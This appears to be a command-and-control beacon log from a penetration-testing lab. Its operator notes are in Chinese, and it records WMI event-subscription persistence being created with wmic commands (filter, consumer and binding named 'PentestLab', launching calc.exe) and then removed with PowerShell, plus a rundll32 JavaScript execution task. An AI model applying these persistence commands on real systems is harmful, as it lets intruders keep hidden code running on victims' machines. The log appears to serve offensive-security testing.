02/24 16:00:58 [metadata] 172.17.2.54 <- 172.17.2.54; computer: A-PC; user: SYSTEM *; pid: 5584; os: Windows; version: 6.1; beacon arch: x86 (x64)
02/24 16:01:01 [task] 4*************进行WMI启动**********
02/24 16:01:01 [task] 4*******请先提权*******
02/24 16:01:01 [task] 4********WMI正在启动,测试后需删除**********
02/24 16:01:45 [task] 4*************进行WMI启动**********
02/24 16:01:45 [task] 4*******请先提权*******
02/24 16:01:45 [task] 4********WMI正在启动,测试后需删除**********
02/24 16:02:22 [task] 4*************进行WMI启动**********
02/24 16:02:22 [task] 4*******请先提权*******
02/24 16:02:22 [task] 4********WMI正在启动,测试后需删除**********
02/24 16:02:36 [task] 4*************进行WMI启动**********
02/24 16:02:36 [task] 启动WMI 
02/24 16:02:36 [task] 4********WMI正在启动,测试后需删除**********
02/24 16:02:48 [checkin] host called home, sent: 673 bytes
02/24 16:03:00 [output]
received output:
ERROR:
Description = Object or property already exists


02/24 16:03:00 [output]
received output:
ERROR:
Description = Object or property already exists


02/24 16:04:41 [task] 4*************进行WMI删除**********
02/24 16:04:41 [task] 删除WMI
02/24 16:04:41 [task] Get-WMIObject -Namespace root\Subscription -Class __EventFilter -Filter "Name='PentestLab'" | Remove-WmiObject -Verbose
02/24 16:04:41 [task] Tasked beacon to run: Get-WMIObject -Namespace root\Subscription -Class __EventFilter -Filter "Name='PentestLab'" | Remove-WmiObject -Verbose
02/24 16:05:00 [checkin] host called home, sent: 383 bytes
02/24 16:05:10 [output]
received output:
#< CLIXML


02/24 16:07:11 [output]
received output:
Instance creation successful.


02/24 16:07:11 [output]
received output:
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><S S="verbose">对目标“\\A-PC\ROOT\Subscription:__EventFilter.Name="PentestLab"”执行操作“Remove-WmiObject”。</S></Objs>

02/24 16:18:48 [task] Rundll32执行js
02/24 16:19:11 [checkin] host called home, sent: 216 bytes
02/24 16:37:00 [task] 4*************进行WMI启动**********
02/24 16:37:00 [task] 启动WMI 
02/24 16:37:00 [task] Tasked beacon to run: wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="PentestLab", EventNameSpace="root\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA'Win32_PerfFormattedData_PerfOS_System'"
02/24 16:37:00 [task] Tasked beacon to run: wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="PentestLab",ExecutablePath="C:\Windows\System32\calc.exe",CommandLineTemplate="C:\Windows\System32\calc.exe"
02/24 16:37:00 [task] Tasked beacon to run: wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"PentestLab\"", Consumer="CommandLineEventConsumer.Name=\"PentestLab\""
02/24 16:37:00 [task] Tasked beacon to run: wmic process call create calc.exe
02/24 16:37:00 [task] 4********WMI正在启动,测试后需删除**********
02/24 16:37:23 [checkin] host called home, sent: 776 bytes
02/24 16:37:27 [output]
received output:
ERROR:
Description = Object or property already exists


02/24 16:37:27 [output]
received output:
ERROR:
Description = Object or property already exists


02/24 16:37:27 [output]
received output:
ERROR:
Description = Object or property already exists


02/24 16:37:27 [output]
received output:
Executing (Win32_Process)->Create()
Method execution successful.
Out Parameters:
instance of __PARAMETERS
{
	ProcessId = 18108;
	ReturnValue = 0;
};



02/24 16:40:17 [task] 4*************进行WMI删除**********
02/24 16:40:17 [task] 删除WMI
02/24 16:40:17 [task] Get-WMIObject -Namespace root\Subscription -Class __EventFilter -Filter "Name='PentestLab'" | Remove-WmiObject -Verbose
02/24 16:40:17 [task] Tasked beacon to run: Get-WMIObject -Namespace root\Subscription -Class __EventFilter -Filter "Name='PentestLab'" | Remove-WmiObject -Verbose
02/24 16:40:27 [checkin] host called home, sent: 383 bytes
02/24 16:40:30 [output]
received output:
#< CLIXML
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><S S="verbose">对目标“\\A-PC\ROOT\Subscription:__EventFilter.Name="PentestLab"”执行操作“Remove-WmiObject”。</S></Objs>

